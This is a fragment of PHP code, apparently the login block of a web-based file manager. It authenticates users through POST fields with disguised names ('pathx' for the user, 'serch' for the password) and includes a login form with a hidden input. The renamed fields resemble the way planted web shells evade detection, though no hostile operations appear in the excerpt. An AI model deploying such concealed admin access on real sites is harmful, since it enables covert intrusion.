...
if ($use_auth) {
    if (isset($_SESSION['logged'], $auth_users[$_SESSION['logged']])) {
        // Logged
    } elseif (isset($_POST['pathx'], $_POST['serch'])) {
        // Logging In
        sleep(1);
        if (isset($auth_users[$_POST['pathx']]) && $_POST['serch'] === $auth_users[$_POST['pathx']]) {
            $_SESSION['logged'] = $_POST['pathx'];
        ...
        <div class="">
            <form action="" method="post" style="margin:10px;text-align:center">
                <input name="pathx" value="." style="display:none" placeholder="" >
